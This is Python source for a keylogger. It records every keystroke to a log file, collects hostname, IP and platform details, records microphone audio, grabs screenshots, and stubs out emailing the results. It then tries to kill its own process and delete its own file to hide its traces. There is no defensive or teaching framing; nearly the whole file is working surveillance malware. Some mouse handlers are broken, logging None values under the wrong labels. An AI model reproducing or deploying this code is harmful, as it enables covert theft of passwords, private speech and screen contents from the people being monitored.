import os
import platform
import socket
import threading
import wave
import pyscreenshot
import sounddevice as sd
from pynput import keyboard
from pynput.keyboard import Listener
import logging
from datetime import datetime

SEND_REPORT_EVERY = 10  # as in seconds
LOG_FILE = 'keylogs.txt'  # File to store logs

class KeyLogger:
    def __init__(self, time_interval):
        self.interval = time_interval
        self.log = ""

    def appendlog(self, string):
        self.log = self.log + string

    def save_log(self, log):
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S,%f")[:-3]  # Get current time in the desired format
        with open(LOG_FILE, 'a') as file:
            file.write(f"{current_time}> {log}\n")  # Include the current time in the log entry

    def on_move(self, x, y):
        current_move = logging.info(f"Mouse moved to {x} {y}")
        self.appendlog(f"{current_move}\n")

    def on_click(self, x, y):
        current_click = logging.info(f"Mouse moved to {x} {y}")
        self.appendlog(f"{current_click}\n")

    def on_scroll(self, x, y):
        current_scroll = logging.info(f"Mouse moved to {x} {y}")
        self.appendlog(f"{current_scroll}\n")

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "

        self.appendlog(current_key)

    def report(self):
        global logs
        self.save_log(self.log)  # Save log to file
        self.log = ""  # Clear current log
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.appendlog(f"{hostname}\n{ip}\n{plat}\n{system}\n{machine}\n")

    def microphone(self):
        fs = 44100
        seconds = SEND_REPORT_EVERY
        obj = wave.open('sound.wav', 'w')
        obj.setnchannels(1)  # mono
        obj.setsampwidth(2)
        obj.setframerate(fs)
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        obj.writeframesraw(myrecording)
        sd.wait()

        # Send email with sound recording
        # Modify this part if you want to implement sound recording functionality

    def screenshot(self):
        img = pyscreenshot.grab()
        # Send email with screenshot
        # Modify this part if you want to implement screenshot functionality

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
        with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
            mouse_listener.join()
        if os.name == "nt":
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                print('File was closed.')
                os.system("DEL " + os.path.basename(__file__))
            except OSError:
                print('File is close.')
        else:
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system('pkill leafpad')
                os.system("chattr -i " + os.path.basename(__file__))
                print('File was closed.')
                os.system("rm -rf" + os.path.basename(__file__))
            except OSError:
                print('File is close.')

# Start keylogger
if __name__ == "__main__":
    keylogger = KeyLogger(SEND_REPORT_EVERY)
    keylogger.run()